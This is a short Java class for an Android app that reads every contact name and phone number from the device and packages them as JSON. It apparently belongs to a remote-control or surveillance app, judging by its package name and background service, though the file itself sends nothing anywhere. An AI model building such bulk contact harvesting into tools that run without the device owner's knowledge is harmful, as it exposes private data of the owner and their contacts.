package com.remote.app;

import android.database.Cursor;
import android.provider.ContactsContract;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class ContactsManager {

    public static JSONObject getContacts() {

        try {
            JSONObject contacts = new JSONObject();
            JSONArray list = new JSONArray();
            Cursor cur = MainService.getContextOfApplication().getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    new String[]{ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER}, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");


            while (cur.moveToNext()) {
                JSONObject contact = new JSONObject();
                String name = cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));// for  number
                String num = cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));// for name
//                String id = cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone._ID));// try this id...

                contact.put("phoneNo", num);
                contact.put("name", name);
                contact.put("id", "");
                list.put(contact);

            }
            contacts.put("contactsList", list);
            return contacts;
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return null;

    }

}
